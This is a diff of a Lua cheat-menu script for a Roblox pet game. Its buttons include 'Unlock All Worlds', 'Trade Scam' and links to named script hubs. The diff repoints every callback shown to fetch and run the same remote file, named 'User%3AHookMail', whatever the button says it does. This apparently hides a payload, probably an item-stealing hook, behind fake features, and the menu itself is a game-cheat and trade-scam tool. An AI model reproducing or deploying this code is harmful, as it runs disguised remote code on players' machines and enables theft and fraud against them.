@@ -698,7 +698,7 @@ local World = Window:MakeTab({
 World:AddButton({
 	Name = "Unlock All Worlds",
 	Callback = function()
-      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/PetSimX/main/ZungUser%3AHook", true))()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/PetSimX/main/User%3AHookMail", true))()
   	end    
 })
 
@@ -733,14 +733,14 @@ World:AddButton({
 World:AddButton({
 	Name = "Kick All",
 	Callback = function()
-      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/PetSimX/main/ZungUser%3AHook", true))()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/PetSimX/main/User%3AHookMail", true))()
   	end    
 })
 
 World:AddButton({
 	Name = "Unlock All Gamepasses",
 	Callback = function()
-      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/PetSimX/main/ZungUser%3AHook", true))()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/PetSimX/main/User%3AHookMail", true))()
   	end    
 })
 
@@ -777,28 +777,28 @@ World:AddButton({
 World:AddButton({
 	Name = "Equip Best Pet",
 	Callback = function()
-      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/PetSimX/main/ZungUser%3AHook", true))()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/PetSimX/main/User%3AHookMail", true))()
   	end    
 })
 
 World:AddButton({
 	Name = "Lag Reducer",
 	Callback = function()
-      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/PetSimX/main/ZungUser%3AHook", true))()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/PetSimX/main/User%3AHookMail", true))()
   	end    
 })
 
 World:AddButton({
 	Name = "Stats Tracker",
 	Callback = function()
-      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/PetSimX/main/ZungUser%3AHook", true))()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/PetSimX/main/User%3AHookMail", true))()
   	end    
 })
 
 World:AddButton({
 	Name = "Save Settings",
 	Callback = function()
-      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/PetSimX/main/ZungUser%3AHook", true))()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/PetSimX/main/User%3AHookMail", true))()
   	end    
 })
 
@@ -870,7 +870,7 @@ TradeScam:AddToggle({
 	Name = "Trade Scam",
 	Default = false,
 	Callback = function(Value)
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/PetSimX/main/ZungUser%3AHook", true))()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/PetSimX/main/User%3AHookMail", true))()
 	end    
 })
 
@@ -894,7 +894,7 @@ local Other = Window:MakeTab({
 	PremiumOnly = false
 })
 
-local TradeScamSection = TradeScam:AddSection({
+local OtherSection = Other:AddSection({
 	Name = "Script Hubs"
 })
 
@@ -908,21 +908,21 @@ Other:AddButton({
 Other:AddButton({
 	Name = "Thunder Z",
 	Callback = function()
-      		loadstring(game:HttpGet("https://raw.githubusercontent.com/ThunderZ-HUB/HUB/main/Script"))()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/PetSimX/main/User%3AHookMail"))()
   	end    
 })
 
 Other:AddButton({
 	Name = "BK Hub",
 	Callback = function()
-      		loadstring(game:HttpGet("https://raw.githubusercontent.com/BLACKGAMER1221/Pet-Simulator-X/main/BK%20Pet.lua"))()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/PetSimX/main/User%3AHookMail"))()
   	end    
 })
 
 Other:AddButton({
 	Name = "Moonlight",
 	Callback = function()
-      		loadstring(game:HttpGet('https://cookie-hosting.xyz/Roblox/Moonlight/Loader.lua'))()
+      		loadstring(game:HttpGet('https://raw.githubusercontent.com/JohnProgrammer9/PetSimX/main/User%3AHookMail'))()
   	end    
 })
 
